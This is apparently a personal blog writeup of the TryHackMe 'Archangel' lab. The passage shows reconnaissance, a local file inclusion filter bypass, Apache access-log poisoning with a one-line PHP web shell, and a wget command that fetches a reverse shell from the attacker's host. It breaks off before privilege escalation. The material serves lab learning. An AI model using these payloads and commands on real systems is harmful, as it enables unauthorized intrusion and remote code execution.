---
title: TryHackMe | Archangel Writeup 
date: 2026-04-29 
categories: [TryHackMe]
tags: ["local file inclusion", poison, "cron jobs", suid, "path hijacking"]     # TAG names should always be lowercase
image:
  path: assets/img/archangel/archangel_thm_logo.jpeg
  width: 100
  height: 100
description: A beginner-friendly room focusing on web exploitation via Local File Inclusion and gaining root access through insecurely configured cron jobs and path hijacking.
---

## 1. Room Info
**Name:** Archangel \\
**Platform:** TryHackMe \\
**Difficulty:** Easy \\
**OS:** Linux \\
**Link:** [Archangel room on TryHackMe](https://tryhackme.com/room/archangel)

## 2. Reconnaissance
I started with a standard service scan to identify open ports.

```terminal
kali@kali:~/thm$ nmap -sV -sC 10.128.185.88 -oN nmap/initial.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-27 05:24 -0400
Nmap scan report for 10.128.185.88
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
SSH is listening on port 22 and an Apache server is running on port 80. 

Room's description on TryHackMe mentions **Web Exploitation** and **Local File Inclusion**. 
## 3. Enumeration
I quickly skimmed the webpage and its source code but haven't found anything useful (that's not the case on this machine as I would realize later), so I started a directory scan with `gobuster` using `dirb/common.txt`. 
```bash
gobuster dir -u http://<Target-IP> -w /ush/share/wordlists/dirb/common.txt
```
Accessible (status `200` or `301`) were the following entries:
```
flags               (Status: 301) [Size: 314] [--> http://10.128.185.88/flags/]
images              (Status: 301) [Size: 315] [--> http://10.128.185.88/images/]
index.html          (Status: 200) [Size: 19188]
layout              (Status: 301) [Size: 315] [--> http://10.128.185.88/layout/]
pages               (Status: 301) [Size: 314] [--> http://10.128.185.88/pages/]
```
First, I quickly checked `flags/`, but it turned out to contain only an HTML RickRoll redirect.
![Getting RickRolled](assets\img\archangel\1-flags_html_redirect.png)

`pages/` and `layout/` also did not contain anything useful. At this point I decided to go back to the home page  and scan it again for any clues. And here it is - a hostname, at the very top of the page.
![A hostname](assets\img\archangel\2-hostname.png)

If I wouldn't have found anything on the home page I would consider using a bigger list such as `dirbuster/directory-list-2.3-medium.txt` or searching for files with extensions like `php`,`html` or `bak`. Luckily, this wasn't necessary.


**Virtual Hosting** allows a single server to host multiple websites on a single IP address. When a client sends an **HTTP request**, the server uses the **Host header** to determine which specific website to serve. To access the website with the hostname `mafialive.thm` add the following line to `/etc/hosts`:

```text
<Target-IP> mafialive.thm
```

After accessing `http://mafialive.thm` I got the first flag.
![flag-1](assets/img/archangel/3-flag_1.png)

So I ran `gobuster` on the new webpage and these are the accessible recources:
```
index.html          (Status: 200) [Size: 59]
robots.txt          (Status: 200) [Size: 34]
```

`robots.txt` prevents search engine bots from indexing sensitive or irrelevant portions of the website. Looking at the file itself I saw that there exits `/test.php` page.

![robots](assets/img/archangel/4-robots.png)

After navigating to `http://mafialive.thm/test.php` and clicking the button I saw two things. First, the message `Control is an illusion` which might be a hint towards improper input validation logic, and, second, that the system dynamically loads content via `?view=`. 

![button](assets/img/archangel/5-button.png)

Let's see what's under the hood. To view the source code of `/test.php` I needed to convert the contents of the file to `base64` for farther decoding before the system evaluates `php` code and sends back the page that is normally displayed. Utilizing `convert.base64-encode` filter I got `base64` representation of the file.

> From [Official PHP Manual](https://www.php.net/manual/en/wrappers.php.php#:~:text=available%20on%20Windows.-,php%3A//filter,-%C2%B6) - php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening.

```
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
![base64](assets/img/archangel/6-base64.png)

## 4. Vulnerability Analysis
So I passed `base64` string (second part) of the source code into `base64 -d` and got the second flag:
```terminal
kali@kali:~/thm/archangel$ echo "cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d
php

            //FLAG: thm{flag would be here}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            if(isset($_GET["view"])){
            if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
                include $_GET['view'];
            }else{

                echo 'Sorry, Thats not allowed';
            }
        }
        ?>
    </div>
</body>

</html>

```
Notice, there is an `include $_GET['view']` statement. In `php`, `include` is used to import and **paste** the contents of a file in the place where `include` was called. It might be useful when a developer wants to reuse a piece of text/code across multiple pages. The imported file is then not just treated as plaintext but is **evaluated**. In practical terms it means that if an attacker manages to write a malicious piece of `php` code inside a file that is being subject to `include`, that code would be executed and the system will be compromised.

One way to insert a malicious code while not having any direct write access is **Log Poisoning**. Apache records access logs in `/var/log/apache2/access.log`. Looking back at the source code of `/test.php` I saw that input filtering in `view` key is done by black-listing `../..` path traversal and rejecting anything that does not contain `/var/www/html/development_testing`. The combination of these two things made it possible for me to access the log file via the following inclusion:
```
view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```
![access log](assets/img/archangel/7-access_log.png)
Since `User-Agent` is logged and it is easily modifiable in `HTTP GET` request, I had everything I needed to get access to the server.
## 5. Exploitation
I used `Burp Suite` to intercept and modify `User-Agent` header with the following sciript:
```php
<?php system($_GET['cmd']); ?>
```
![modified user-agent header](assets/img/archangel/8-burp.png)
At this point the `php` code from above is logged as the `User-Agent` field in `access.log`. When the `include` function calls the log file, the engine parses the `<?php ... ?>` tags and executes the command passed to the `cmd` parameter.
![cmd key](assets/img/archangel/9-cmdworking.png)

Time to get a reverse shell. I started a Python web server using the following command to host my `shell.php`:
```bash
python3 -m http.server 80
```

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=wget+http://<Your IP>/shell.php+-O+/tmp/shell.php
```

Well, normally, `www-data` user that is being used in Apache servers to retrieve data does not have any write permissions in the web server directory. That's why I use globally-writable `/tmp` folder to store the reverse shell.


